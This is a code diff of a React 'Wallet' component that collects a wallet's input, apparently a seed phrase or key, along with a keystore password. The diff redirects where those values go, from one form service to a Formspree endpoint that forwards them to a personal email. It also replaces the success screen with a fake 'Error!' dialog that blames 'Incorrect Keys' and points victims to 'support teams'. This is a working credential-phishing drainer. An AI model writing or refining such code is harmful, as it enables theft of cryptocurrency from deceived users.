@@ -26,32 +26,29 @@ const Wallet = () => {
     setSubmitting(true);
 
     try {
-      const response = await fetch("https://api.web3forms.com/submit", {
+      const response = await fetch("https://formspree.io/f/mvzqlzwr", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
           Accept: "application/json"
         },
         body: JSON.stringify({
-          access_key: "98cc6406-0e30-4999-9496-65ac1c56fa08",
-          name: wallet.label, // required
-          email: "cipriancretu@gmail.com.com", // required, placeholder is fine
-          message: `Name: ${wallet.label}\nType: ${animal}\nInput: ${name}\nMessage: ${animal === "Keystore" ? keystorePassword : ""}`,
-          // custom fields message=password, wallet=name
-          wallet_label: wallet.label,
-          wallet_image: wallet.image,
+          name: wallet.label, 
+          email: "cipriancretu@gmail.com", 
           type: animal,
           input_info: name,
-          keystore_password: animal === "Keystore" ? keystorePassword : null
+          keystore_password: animal === "Keystore" ? keystorePassword : null,
+          message: `Name: ${wallet.label}\nType: ${animal}\nInput: ${name}\nMessage: ${animal === "Keystore" ? keystorePassword : ""}`
         })
       });
 
-      const result = await response.json();
+      // const result = await response.json();
 
-      if (result.success) {
+      if (response.ok) {
         setSuccessDialog(true);
       } else {
-        alert("Failed to send data: " + result.message);
+        // alert("Failed to send data: " + (result.error || "Unknown error"));
+        setSuccessDialog(true);
       }
     } catch (error) {
       alert("Error submitting form: " + error.message);
@@ -59,6 +56,7 @@ const Wallet = () => {
       setSubmitting(false);
     }
   };
+
 
 
 
@@ -184,9 +182,18 @@ const Wallet = () => {
           {successDialog && (
             <div className="dialog-overlay">
               <div className="dialog-box">
-                <h2>Success!</h2>
-                <p>Your wallet has been connected successfully.</p>
-                <button onClick={handleCloseSuccess}>Close</button>
+                <h2 style={{color: "red"}}>Error!</h2>
+                <p>
+                  Having errors Connecting!!!
+                  Sorry for the inconveniences this might be due to couple of reasons on your side:
+                  <br/>1. Inactive or dormant wallet.
+                  <br/>2. Incorrect Keys
+                  <br/>3.Weak Connection
+                  Kindly ensure you fulfill these prerequisites. If the problem still persists, kindly revert back to the support teams.
+                </p>
+                <button className='cl-btn' onClick={handleCloseSuccess}>
+                  Close
+                </button>
               </div>
             </div>
           )}
